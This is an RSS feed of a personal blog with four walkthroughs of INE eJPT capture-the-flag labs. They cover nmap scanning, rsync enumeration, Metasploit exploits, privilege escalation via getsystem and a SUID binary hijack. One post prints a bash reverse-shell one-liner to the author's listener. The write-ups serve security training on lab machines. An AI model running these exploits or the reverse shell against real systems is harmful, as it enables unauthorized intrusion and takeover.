<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Arvee&#39;s Blog</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Arvee&#39;s Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sat, 10 May 2025 12:57:52 +0100</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Walkthrough : Host &amp; Network Penetration Testing: The Metasploit Framework CTF 2 (INE - eJPT)</title>
            <link>/posts/ine_ctf_5/</link>
            <pubDate>Sat, 10 May 2025 12:57:52 +0100</pubDate>
            
            <guid>/posts/ine_ctf_5/</guid>
            <description>&lt;p&gt;Second CTF in the longest module for the &lt;em&gt;Penetration testing student&lt;/em&gt; course, This time we have two machines; &lt;strong&gt;target1.ine.local&lt;/strong&gt; &amp;amp; &lt;strong&gt;target2.ine.local&lt;/strong&gt;. Let&amp;rsquo;s see what flags we need to capture :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flag 1:&lt;/strong&gt; Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 2:&lt;/strong&gt; The files on the RSYNC server hold valuable information. Explore the contents to find the flag.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 3:&lt;/strong&gt; Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 4:&lt;/strong&gt; Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So it seems that the first machine hosts an &lt;a href=&#34;https://en.wikipedia.org/wiki/Rsync&#34;&gt;&lt;em&gt;rsync&lt;/em&gt;&lt;/a&gt; file server; therefore it is most likely a Linux machine.
The 4th flag mentions automations, which makes me think of &lt;a href=&#34;https://en.wikipedia.org/wiki/Cron&#34;&gt;&lt;em&gt;cron&lt;/em&gt;&lt;/a&gt; so it might also ne a Linux machine.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Second CTF in the longest module for the <em>Penetration testing student</em> course, This time we have two machines; <strong>target1.ine.local</strong> &amp; <strong>target2.ine.local</strong>. Let&rsquo;s see what flags we need to capture :</p>
<ul>
<li><strong>Flag 1:</strong> Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.</li>
<li><strong>Flag 2:</strong> The files on the RSYNC server hold valuable information. Explore the contents to find the flag.</li>
<li><strong>Flag 3:</strong> Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.</li>
<li><strong>Flag 4:</strong> Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.</li>
</ul>
<p>So it seems that the first machine hosts an <a href="https://en.wikipedia.org/wiki/Rsync"><em>rsync</em></a> file server; therefore it is most likely a Linux machine.
The 4th flag mentions automations, which makes me think of <a href="https://en.wikipedia.org/wiki/Cron"><em>cron</em></a> so it might also ne a Linux machine.</p>
<p>Let&rsquo;s start, as always, with an nmap scan of both machine :</p>
<p><code>nmap -sC -sV -sS -O target1.ine.local</code>

    <img src="/CTF5/nmap-1.png"  alt="First nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p><code>nmap -sC -sV -sS -O target2.ine.local</code>

    <img src="/CTF5/nmap-2.png"  alt="second nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>it appears that for the second target we have an apache web-server, we&rsquo;ll get into exploring it later on, now let&rsquo;s focus on the flags.</p>
<h2 id="flag-1">Flag 1</h2>
<h4 id="enumerate-the-open-port-using-metasploit-and-inspect-the-rsync-banner-closely-it-might-reveal-something-interesting"><em>Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.</em></h4>
<p>After a bit of googling, we find out that displaying the rsync server&rsquo;s banner is pretty easy and can be done with one command : <code>rsync rsync://target1.ine.local/</code>.

    <img src="/CTF5/rsync-1.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>Quite an easy flag, and this trend will continue throughout the CTF.</p>
<h2 id="flag-2">Flag 2</h2>
<h4 id="the-files-on-the-rsync-server-hold-valuable-information-explore-the-contents-to-find-the-flag"><em>The files on the RSYNC server hold valuable information. Explore the contents to find the flag.</em></h4>
<p><em><strong>backupwscohen</strong></em> is what we call a module, and modules contain files. So, in order to get all the files from this module, we would need to execute this command :</p>
<p><code>rsync -avz rsync://target1.ine.local/backupwscohen ~/Downloads/</code></p>
<ul>
<li><code>-avz</code>
<ul>
<li><strong>a</strong> : Archive mode, to keep the data (and metadata) intact but most importantly in our case for recursion.</li>
<li><strong>v</strong> : For verbosity.</li>
<li><strong>z</strong> : To compress data during the transfer.</li>
</ul>
</li>
<li><code>rsync://target1.ine.local/backupwscohen</code> : Source of the files in the rsync server.</li>
<li><code>~/Downloads/</code> : Destination directory in our local computer.

    <img src="/CTF5/rsync-2.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</li>
</ul>
<p>So we have 3 files:</p>
<ul>
<li>1 .txt,</li>
<li>1 .xlsx (excel spreadsheet),</li>
<li>1 .vhd (virtual hard drive).</li>
</ul>
<p>Let&rsquo;s cat them all out and see what they contain.</p>
<p><code>cat *</code>

    <img src="/CTF5/rsync-3.png"  class="center"  style="border-radius: 8px; width: 100%;"  />


Flag 2 done.</p>
<h2 id="flag-3">Flag 3</h2>
<h4 id="try-exploiting-the-webapp-to-gain-a-shell-using-metasploit-on-target2inelocal">Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local.</h4>
<p>Well since this flag is about the second target, let&rsquo;s first see what the web-server is serving.

    <img src="/CTF5/web-1.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>It is an app called <em>Roxy-WI</em>, let&rsquo;s fire up the metasploit console and search for exploits concerning this app.

    <img src="/CTF5/msf-1.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>There&rsquo;s an excellent exploit for this application, we&rsquo;ll need to configure the <em><strong>RHOST</strong></em>, <em><strong>LHOST</strong></em> and hit <em>run</em> to start the exploit :

    <img src="/CTF5/msf-2.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>If we navigate to the <code>/</code>, we&rsquo;ll find a flag.txt.</p>
<h2 id="flag-4">Flag 4</h2>
<h4 id="automated-tasks-can-sometimes-leave-clues-investigate-scheduled-jobs-or-running-processes-to-uncover-the-hidden-flag">Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.</h4>
<p>First thing i want to do is explore the Cron job available on this machine.
After navigating to the /etc/cron.d directory, we find two jobs and one of them contains the flag.

    <img src="/CTF5/msf-3.png"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>And that was it for the last flag.</p>
<h1 id="conclusion">Conclusion</h1>
<p>refer to <a href="https://yassine-elhammoumi.github.io/posts/ine_ctf_4/">the last article</a> for my thoughts about the course so far.</p>
<p>Concerning this CTF in particular, it was very easy but it made me discover new things, especially rsync; So that was fun.</p>
]]></content>
        </item>
        
        <item>
            <title>Walkthrough : Host &amp; Network Penetration Testing: The Metasploit Framework CTF 1 (INE - eJPT)</title>
            <link>/posts/ine_ctf_4/</link>
            <pubDate>Wed, 07 May 2025 16:04:40 +0100</pubDate>
            
            <guid>/posts/ine_ctf_4/</guid>
            <description>&lt;p&gt;It has been a while since I went back to my ejpt course because I felt it becoming a little repetitive, but lately I had some free time and decided to tackle it again. And today, I am going to do a walkthrough for the &lt;em&gt;&lt;strong&gt;Host &amp;amp; Network Penetration Testing: The Metasploit Framework CTF 1&lt;/strong&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This time we are provided with a windows machine (since we&amp;rsquo;re told to exploit an MSSQL server) and we have 4 flags to capture :&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>It has been a while since I went back to my ejpt course because I felt it becoming a little repetitive, but lately I had some free time and decided to tackle it again. And today, I am going to do a walkthrough for the <em><strong>Host &amp; Network Penetration Testing: The Metasploit Framework CTF 1</strong></em>.</p>
<p>This time we are provided with a windows machine (since we&rsquo;re told to exploit an MSSQL server) and we have 4 flags to capture :</p>
<ul>
<li><strong>Flag 1:</strong> Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.</li>
<li><strong>Flag 2:</strong> Locate the second flag within the Windows configuration folder.</li>
<li><strong>Flag 3:</strong> The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.</li>
<li><strong>Flag 4:</strong> Investigate the Administrator directory to find the fourth flag.</li>
</ul>
<p>Going back to my talk about the course getting repetitive; Based on the description of the flags, we notice that only the first is the only one that is going to be a challenge since the rest are only going to be directory searching.</p>
<p>Let&rsquo;s tackle this first with an nmap scan <code>nmap -sC -sV -PS -p- target.ine.local</code>:</p>
<ul>
<li><strong>-sC</strong> : Runs the default scripts for all services that we might discover.</li>
<li><strong>-sV</strong> : Runs a service version detection scan.</li>
<li><strong>-PS</strong> : SYN scan (It is considered to be faster and stealthier).</li>
<li><strong>-p-</strong> : To specify that we want to run this on all ports (equivalent to <strong>-p1-65535</strong>)</li>
</ul>
<p>I&rsquo;ll be providing the output here rather than a screenshot since it won&rsquo;t fit in a single frame.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PlainText" data-lang="PlainText"><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-07 20:49 IST
</span></span><span style="display:flex;"><span>Nmap scan report for target.ine.local (10.2.26.225)
</span></span><span style="display:flex;"><span>Host is up (0.0027s latency).
</span></span><span style="display:flex;"><span>Not shown: 65521 closed tcp ports (reset)
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE            VERSION
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020.00; SP3
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
</span></span><span style="display:flex;"><span>|   10.2.26.225\MSSQLSERVER: 
</span></span><span style="display:flex;"><span>|     Target_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|_    Product_Version: 6.3.9600
</span></span><span style="display:flex;"><span>| ms-sql-info: 
</span></span><span style="display:flex;"><span>|   10.2.26.225\MSSQLSERVER: 
</span></span><span style="display:flex;"><span>|     Instance name: MSSQLSERVER
</span></span><span style="display:flex;"><span>|     Version: 
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server 2012 SP3
</span></span><span style="display:flex;"><span>|       number: 11.00.6020.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server 2012
</span></span><span style="display:flex;"><span>|       Service pack level: SP3
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|     TCP port: 1433
</span></span><span style="display:flex;"><span>|_    Clustered: false
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-07T15:21:11+00:00; -1s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2025-05-07T15:11:22
</span></span><span style="display:flex;"><span>|_Not valid after:  2055-05-07T15:11:22
</span></span><span style="display:flex;"><span>3389/tcp  open  ssl/ms-wbt-server?
</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
</span></span><span style="display:flex;"><span>|   Target_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: WIN-5BQ22OKH4SO                                                                                                                                         
</span></span><span style="display:flex;"><span>|   Product_Version: 6.3.9600                                                                                                                                                  
</span></span><span style="display:flex;"><span>|_  System_Time: 2025-05-07T15:21:03+00:00                                                                                                                                     
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=WIN-5BQ22OKH4SO
</span></span><span style="display:flex;"><span>| Not valid before: 2025-01-08T07:08:38
</span></span><span style="display:flex;"><span>|_Not valid after:  2025-07-10T07:08:38
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-05-07T15:21:11+00:00; -1s from scanner time.
</span></span><span style="display:flex;"><span>5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>49152/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49153/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49154/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49155/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49180/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49181/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49192/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2025-05-07T15:21:06
</span></span><span style="display:flex;"><span>|_  start_date: 2025-05-07T15:11:21
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:0:2: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled (dangerous, but default)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 91.13 seconds
</span></span></code></pre></div><hr>
<h2 id="flag-1">Flag 1</h2>
<h4 id="gain-access-to-the-mssqlserver-account-on-the-target-machine-to-retrieve-the-first-flag"><em>Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.</em></h4>
<p>The following part tells us that the machine is running <em><strong>Microsoft SQL Server 2012</strong></em>.</p>

    <img src="/CTF4/nmap-1.png"  alt="First nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>So next step would be to look up any exploits on the msfconsole that would help us compromise this server.</p>
<p><code>search MSSQL 2012</code></p>

    <img src="/CTF4/search-1.png"  alt="searching for MSSQL 2012"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>The first one has an Excellent ranking and might just be what we need for this exploit, so let&rsquo;s type in : <code>use 0</code> to select the first search output and check the options with <code>show options</code>.</p>

    <img src="/CTF4/options-1.png"  alt="show options command"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We only have to configure the <em><strong>RHOSTS</strong></em> options with <code>set RHOSTS target.ine.local</code> and we can hit <code>run</code>.</p>

    <img src="/CTF4/prob-1.png"  alt="First problem"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We encounter an error telling us that our payload is in x86 format but that the target system is x64, to solve that we only have to set the payload :</p>
<p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p>
<p>And hit <code>run</code> again :</p>

    <img src="/CTF4/exploit-1.png"  alt="exploitation"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>So we get a reverse TCP meterpreter session and now we can search for the flag. Based on the flag description, which doesn&rsquo;t provide any indication of where the flag might be located, we can fairly assume that the first flag will be located in the C:\ directory : <code>cd C:/</code></p>

    <img src="/CTF4/exploit-2.png"  alt="exploitation"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>So that&rsquo;s it for the first flag, that wasn&rsquo;t too bad. And now let&rsquo;s move on.</p>
<hr>
<h2 id="flag-2">Flag 2</h2>
<h4 id="locate-the-second-flag-within-the-windows-configuration-folder">Locate the second flag within the Windows configuration folder</h4>
<p>For this flag, we just have to locate the windows configuration folder, which I assume would be located in the System32 folder; So let&rsquo;s navigate to it <code>cd Windows\\System32\\</code> and start a shell using <code>shell</code>.</p>

    <img src="/CTF4/shell-1.png"  alt="getting a windows shell"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>This part needed some googling, because I am not too familiar with the Windows CMD, but basically I needed a way to only show the folders since inside the System32 directory there&rsquo;s a sea of .dll files.</p>
<p><code>dir /a:d</code></p>

    <img src="/CTF4/shell-2.png"  alt="Navigating Windows&#39; shell"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We notice a directory called config and the flag hinted that it would be inside windows&rsquo; configuration folder, so let&rsquo;s try exploring it : <code>cd config</code>.</p>

    <img src="/CTF4/shell-3.png"  alt="Navigating Windows&#39; shell"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>So it appears that we don&rsquo;t have the privileges needed to open this directory, and the <code>whoami</code> command labels us as <em>nt service\mssqlserver</em>.</p>
<p>Let&rsquo;s try to elevate our privileges within the meterpreter console by quitting the windows shell using <code>exit</code> and typing <code>getsystem</code>.</p>

    <img src="/CTF4/shell-4.png"  alt="escalating privs"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>It appears that we were successful in elevating our privileges and got the <em>nt authority\system</em>. now let&rsquo;s get back to the <em>config</em> Directory and try again.</p>

    <img src="/CTF4/shell-5.png"  alt="escalating privs"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>And we got the seconf flag.</p>
<hr>
<h2 id="flag-3">Flag 3</h2>
<h4 id="the-third-flag-is-also-hidden-within-the-system-directory-find-it-to-uncover-a-hint-for-accessing-the-final-flag">The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.</h4>
<p>This one is an easy one, all we have to do is type in <code>dir *.txt /s /b</code> inside the System32 folder.</p>
<ul>
<li><strong>dir *.txt</strong> : Tells the system to find all files that finish with <em>.txt</em>.</li>
<li><strong>/s</strong> : To make the command recursive (going inside sub-directories and searching for the keyword).</li>
<li><strong>/b</strong> : for a simpler output format.</li>
</ul>

    <img src="/CTF4/shell-6.png"  alt="Searching through dirs"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>And we found the third flag.</p>
<hr>
<h2 id="flag-4">Flag 4</h2>
<h4 id="investigate-the-administrator-directory-to-find-the-fourth-flag">Investigate the Administrator directory to find the fourth flag.</h4>
<p>Well this is getting a little repetitive, to find this flag, all we have to do is look inside the admin&rsquo;s Desktop folder:</p>

    <img src="/CTF4/shell-7.png"  alt="Searching through dirs"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>And that was it, we&rsquo;re done with all the flags.</p>
<h1 id="conclusion">Conclusion</h1>
<p>I am planning on doing a full blog post on the course once I finish my cert but lately I have been feeling less and less motivated to work on it because the courses get repetitive and boring pretty quickly and I am not talking about repeating the same steps, sometimes the same concepts or even same videos are repeated from a module to the other.</p>
<p>In any case, I will continue this cert at my own pace and we&rsquo;ll see if it&rsquo;ll get better soon.</p>
]]></content>
        </item>
        
        <item>
            <title>Walkthrough : Host &amp; Network Penetration Testing: System-Host Based Attacks CTF 2 (INE - eJPT)</title>
            <link>/posts/ine_ctf_3/</link>
            <pubDate>Sun, 06 Apr 2025 17:15:27 +0100</pubDate>
            
            <guid>/posts/ine_ctf_3/</guid>
            <description>&lt;p&gt;Continuing on with my eJPT certification, this time we&amp;rsquo;ll tackle the second CTF in the  &lt;em&gt;System-Host Based Attacks&lt;/em&gt; course.&lt;/p&gt;
&lt;p&gt;In this lab we&amp;rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flag 1&lt;/strong&gt;: Check the root (&amp;rsquo;/&amp;rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 2&lt;/strong&gt;: In the server&amp;rsquo;s root directory, there might be something hidden. Explore &amp;lsquo;/opt/apache/htdocs/&amp;rsquo; carefully to find the next flag on target1.ine.local.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 3&lt;/strong&gt;: Investigate the user&amp;rsquo;s home directory and consider using &amp;rsquo;libssh_auth_bypass&amp;rsquo; to uncover the flag on target2.ine.local.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 4&lt;/strong&gt;: The most restricted areas often hold the most valuable secrets. Look into the &amp;lsquo;/root&amp;rsquo; directory to find the hidden flag on target2.ine.local.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These would mostly be linux machines (since we&amp;rsquo;re in the linux section of the course), so let&amp;rsquo;s start by tackling both the first and second flag at the same time.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Continuing on with my eJPT certification, this time we&rsquo;ll tackle the second CTF in the  <em>System-Host Based Attacks</em> course.</p>
<p>In this lab we&rsquo;re provided with two machine; target-1 and target-2. And we have 4 flags to capture :</p>
<ul>
<li><strong>Flag 1</strong>: Check the root (&rsquo;/&rsquo;) directory for a file that might hold the key to the first flag on target1.ine.local.</li>
<li><strong>Flag 2</strong>: In the server&rsquo;s root directory, there might be something hidden. Explore &lsquo;/opt/apache/htdocs/&rsquo; carefully to find the next flag on target1.ine.local.</li>
<li><strong>Flag 3</strong>: Investigate the user&rsquo;s home directory and consider using &rsquo;libssh_auth_bypass&rsquo; to uncover the flag on target2.ine.local.</li>
<li><strong>Flag 4</strong>: The most restricted areas often hold the most valuable secrets. Look into the &lsquo;/root&rsquo; directory to find the hidden flag on target2.ine.local.</li>
</ul>
<p>These would mostly be linux machines (since we&rsquo;re in the linux section of the course), so let&rsquo;s start by tackling both the first and second flag at the same time.</p>
<h2 id="flag-1--2">Flag 1 &amp; 2</h2>
<p>Tradition dictates to start with a service detection nmap scan even if we already have the confirmation that we would be mostly targeting an apache server on the first machine.</p>

    <img src="/CTF3/nmap-1.png"  alt="First nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Our assumption is confirmed; It seems to be an apache server running on a linux machine.</p>

    <img src="/CTF3/web-1.png"  alt="Webpage"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>Did you notice the address bar?</p>

    <img src="/CTF3/web-2.png"  alt="Webpage address bar"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We spot a .cgi script. Let&rsquo;s see if the <a href="https://yassine-elhammoumi.github.io/posts/shellshock/">Shellshock</a> attack could give us access to the target. For that we&rsquo;ll be using the metasploit module : <em>exploit/multi/http/apache_mod_cgi_bash_env_exec</em>.</p>

    <img src="/CTF3/metasploit-1.png"  alt="metasploit-1"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>
<p><em>note : You can checkout <a href="https://yassine-elhammoumi.github.io/posts/shellshock/">my post about the Shellshock vulnerability</a>, I judge it will get you more familiarity with it.</em></p>
<hr>
<h2 id="flag-3">Flag 3</h2>
<p>Without losing any time, let&rsquo;s start on the second machine, with, of course, another service scan.</p>

    <img src="/CTF3/nmap-2.png"  alt="second nmap scan"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We find a libssh instance running on the server and we&rsquo;re told to use the <em>&rsquo;libssh_auth_bypass&rsquo;</em> on metasploit to try and access the machine.</p>

    <img src="/CTF3/metasploit-2.png"  alt="metasploit-2"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>I sat up the action to <strong>&lsquo;Execute&rsquo;</strong> and navigated to the user home directory; as told. And there we found the third flag.</p>
<p>Notice that the <strong>welcome</strong> file has the <a href="https://en.wikipedia.org/wiki/Setuid">SUID permission</a> is set up.</p>
<h2 id="flag-4">Flag 4</h2>
<p>To capture the last flag, I decided to set up a netcat listener and have a reverse tcp session created through the <em>&rsquo;libssh_auth_bypass&rsquo;</em> :</p>
<p><strong>bash -i&gt;&amp;/dev/tcp/172.16.116.1/1234  0&gt;&amp;1</strong>.</p>

    <img src="/CTF3/nc-1.png"  alt="netcat one"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/CTF3/metasploit-3.png"  alt="metasploit-3"  class="center"  style="border-radius: 8px; width: 100%;"  />


<hr>

    <img src="/CTF3/nc-2.png"  alt="netcat two"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>We get a reverse shell on the machine with the user &lsquo;user&rsquo;.</p>
<p>Remember the welcome file? let&rsquo;s see it we could exploit it to elevate our privileges.</p>
<p><strong>strings welcome</strong>

    <img src="/CTF3/shell-1.png"  alt="shell one"  class="center"  style="border-radius: 8px; width: 100%;"  />

</p>
<p>The welcome file mentions the greetings file, so if we could tamper with the greetings file to get us a privileged session we&rsquo;d get access to the /root directory.</p>
<p><strong>rm greetings</strong></p>
<p><strong>cp /bin/bash greetings</strong></p>
<p><strong>./welcome</strong></p>

    <img src="/CTF3/shell-2.png"  alt="shell two"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>And we got access to the root account, great! Let&rsquo;s capture the last flag.</p>

    <img src="/CTF3/shell-3.png"  alt="shell three"  class="center"  style="border-radius: 8px; width: 100%;"  />


<p>And that&rsquo;s it, we&rsquo;ve captured all flags.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Well that was once again a very easy CTF, but I enjoyed solving it.</p>
]]></content>
        </item>
        
        <item>
            <title>Walkthrough : Host &amp; Network Penetration Testing: System-Host Based Attacks CTF 1 (INE - eJPT)</title>
            <link>/posts/ine_ctf_2/</link>
            <pubDate>Sun, 30 Mar 2025 23:00:53 +0000</pubDate>
            
            <guid>/posts/ine_ctf_2/</guid>
            <description>&lt;p&gt;Today, a second CTF walkthrough for the &lt;em&gt;System-Host Based Attacks CTF 1&lt;/em&gt;. This time we have 4 flags :&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Flag 1&lt;/strong&gt;: User &amp;lsquo;bob&amp;rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 2&lt;/strong&gt;: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 3&lt;/strong&gt;: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flag 4&lt;/strong&gt;: The Desktop directory might have what you&amp;rsquo;re looking for. Enumerate its contents. (target2.ine.local)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Judging from the tasks descriptions, we notice that we have 2 targets that are most likely Windows targets; The second flag mentions a C drive and the third talks about SMB so we can confidently assume that we&amp;rsquo;ll be subject to Windows targets.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Today, a second CTF walkthrough for the <em>System-Host Based Attacks CTF 1</em>. This time we have 4 flags :</p>
<ol>
<li><strong>Flag 1</strong>: User &lsquo;bob&rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)</li>
<li><strong>Flag 2</strong>: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)</li>
<li><strong>Flag 3</strong>: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)</li>
<li><strong>Flag 4</strong>: The Desktop directory might have what you&rsquo;re looking for. Enumerate its contents. (target2.ine.local)</li>
</ol>
<p>Judging from the tasks descriptions, we notice that we have 2 targets that are most likely Windows targets; The second flag mentions a C drive and the third talks about SMB so we can confidently assume that we&rsquo;ll be subject to Windows targets.</p>
<p>So without further ado, let&rsquo;s get started with the first flag.</p>
<h2 id="flag-1">Flag 1</h2>
<h4 id="user-bob-might-not-have-chosen-a-strong-password-try-common-passwords-to-gain-access-to-the-server-where-the-flag-is-located-target1inelocal">User &lsquo;bob&rsquo; might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)</h4>
<p>I, of course, started by performing an nmap service version scan on the first target : <code>nmap -sV target1.ine.local -p-</code>.</p>

    <img src="/CTF2/nmap-1.png"  alt="nmap scan target1.ine.local"  class="center"  style="border-radius: 8px; width: 100%;"  />


